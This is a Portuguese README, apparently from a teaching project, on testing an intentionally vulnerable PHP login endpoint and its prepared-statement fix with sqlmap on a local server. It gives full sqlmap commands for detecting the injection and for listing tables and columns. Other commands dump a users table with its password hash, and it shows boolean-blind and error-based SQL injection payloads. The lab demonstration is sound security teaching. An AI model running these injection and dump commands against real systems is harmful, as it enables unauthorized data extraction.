# Testando esta pasta com sqlmap

Este exemplo (`login()` com concatenação direta na query SQL) foi testado de
verdade com [sqlmap](https://sqlmap.org) 1.10.8. Os comandos abaixo já foram
validados neste projeto.

## Rodar tudo de uma vez

```bash
./testar-com-sqlmap.sh
```

Sobe um `php -S 127.0.0.1:8899` servindo `endpoint-vulneravel.php` e
`endpoint-corrigido.php`, roda o sqlmap contra os dois, e imprime um resumo
no final. Derruba o servidor sozinho ao terminar.

## Comandos manuais (passo a passo)

1. Suba o servidor embutido do PHP nesta pasta:

```bash
php -S 127.0.0.1:8899
```

2. Em outro terminal, rode o sqlmap contra o endpoint **vulnerável**:

```bash
sqlmap -u "http://127.0.0.1:8899/endpoint-vulneravel.php?usuario=admin&senha=x" \
  -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite --flush-session
```

Resultado esperado — sqlmap confirma **2 técnicas de injeção** no parâmetro `usuario`:

```
Parameter: usuario (GET)
    Type: boolean-based blind
    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
    Payload: usuario=admin' AND CASE WHEN 1235=1235 THEN 1235 ELSE JSON(CHAR(69,71,81,88)) END-- DJln&senha=x

    Type: error-based
    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
    Payload: usuario=admin' AND 9708=JSON_EXTRACT(...)-- Yons&senha=x
```

3. Para ir além e **extrair os dados de verdade** (prova de impacto real — dump da tabela, incluindo o hash da senha):

```bash
sqlmap -u "http://127.0.0.1:8899/endpoint-vulneravel.php?usuario=admin&senha=x" \
  -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite --flush-session \
  --dump -T usuarios
```

Resultado obtido neste projeto:

```
Database: <current>
Table: usuarios
+----+---------+----------------------------------+
| id | usuario | senha_hash                       |
+----+---------+----------------------------------+
| 1  | admin   | 8ba4b2bed568d78d3f03a56c5788c272 |
+----+---------+----------------------------------+
```

4. Agora rode o MESMO ataque contra o endpoint **corrigido** (prepared statements):

```bash
sqlmap -u "http://127.0.0.1:8899/endpoint-corrigido.php?usuario=admin&senha=x" \
  -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite --flush-session
```

Resultado esperado — sqlmap não encontra nenhuma injeção:

```
[WARNING] GET parameter 'usuario' does not seem to be injectable
[ERROR] all tested parameters do not appear to be injectable.
```

## Sobre os arquivos `endpoint-*.php`

`vulneravel.php`/`corrigido.php` só expõem **funções PHP puras** (para o
`teste.php` rápido do projeto, sem precisar de servidor). Mas sqlmap testa
**parâmetros HTTP**, não chama função PHP diretamente — por isso esta pasta
tem também `endpoint-vulneravel.php` e `endpoint-corrigido.php`, que são
finos "wrappers" HTTP em cima das mesmas funções, só para servir de alvo
real ao sqlmap. Eles não fazem parte da suite `teste.php`/`run-tests.sh`.

## Opções sqlmap usadas e por quê

| Opção | Motivo |
|---|---|
| `--batch` | Não pergunta nada interativamente, usa sempre a resposta padrão |
| `-p usuario` | Foca só no parâmetro `usuario` (o `senha` não é injetável aqui, já que vira `md5()` antes de entrar na query) |
| `--level=3 --risk=2` | Nível intermediário de agressividade — suficiente pra achar essa injeção sem demorar muito nem arriscar payloads destrutivos |
| `--technique=BE` | Só testa Boolean-based blind e Error-based (as duas técnicas que funcionam aqui) — mais rápido que testar todas |
| `--dbms=SQLite` | Já sabemos que o banco é SQLite, isso pula a fase de fingerprint do DBMS e acelera bastante |
| `--flush-session` | Ignora cache de sessão anterior do sqlmap para esta URL, garante um teste limpo |



1. Listar tabelas
sqlmap -u "http://127.0.0.1:8899/endpoint-vulneravel.php?usuario=admin&senha=x" \
  -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite --flush-session \
  --tables
→ encontra a tabela usuarios (banco lógico SQLite_masterdb)

2. Listar colunas dessa tabela (agora com -T usuarios)
sqlmap -u "http://127.0.0.1:8899/endpoint-vulneravel.php?usuario=admin&senha=x" \
  -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite --flush-session \
  -T usuarios --columns
→ id (INTEGER), usuario (TEXT), senha_hash (TEXT)

3. Extrair o conteúdo
sqlmap -u "http://127.0.0.1:8899/endpoint-vulneravel.php?usuario=admin&senha=x" \
  -p usuario --batch --level=3 --risk=2 --technique=BE --dbms=SQLite --flush-session \
  -T usuarios --dump
→ retorna a linha completa: id=1 | usuario=admin | senha_hash=8ba4b2bed568d78d3f03a56c5788c272


